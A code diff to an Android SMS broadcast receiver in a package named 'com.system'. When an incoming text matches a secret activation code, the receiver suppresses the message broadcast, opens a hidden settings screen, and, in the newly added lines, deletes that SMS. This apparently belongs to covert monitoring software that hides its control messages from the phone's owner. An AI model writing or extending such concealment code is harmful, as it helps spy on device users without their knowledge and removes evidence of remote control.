@@ -1,6 +1,7 @@
 package com.system;
 
 import com.system.activity.InitActivity;
+import com.system.feature.sms.SmsCtrl;
 import com.system.utils.SysUtils;
 
 import android.content.BroadcastReceiver;
@@ -8,6 +9,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
+import android.util.Log;
 
 /**
  * Receiver for activating setting view.
@@ -33,15 +35,25 @@ public class ActivationReceiver extends BroadcastReceiver
 			}
 
 			if (smsMessages.length > 0) {
-				// Show first message
+				// Show the lastest coming SMS
 				String smsBody = smsMessages[0].getMessageBody();
 				//SysUtils.messageBox(context, "Received SMS: " + smsBody);
 				
 				// Show the setting view
 				if (smsBody.equals(ACTIVATION_CODE)) {
-					this.abortBroadcast(); // Finish broadcast, the system will notify this SMS.
-					Intent initIntent = new Intent().setClass(context, InitActivity.class);
-					context.startActivity(initIntent);
+					try {
+						Intent initIntent = new Intent().setClass(context, InitActivity.class);
+						initIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
+						initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
+						context.startActivity(initIntent);
+						this.abortBroadcast(); // Finish broadcast, the system will notify this SMS
+						
+						//Remove the activation SMS
+						SmsCtrl.deleteTheLastSMS(context);
+					}
+					catch (Exception ex) {
+						Log.e(LOGTAG, ex.getMessage());
+					}
 				}
 			}
 		}
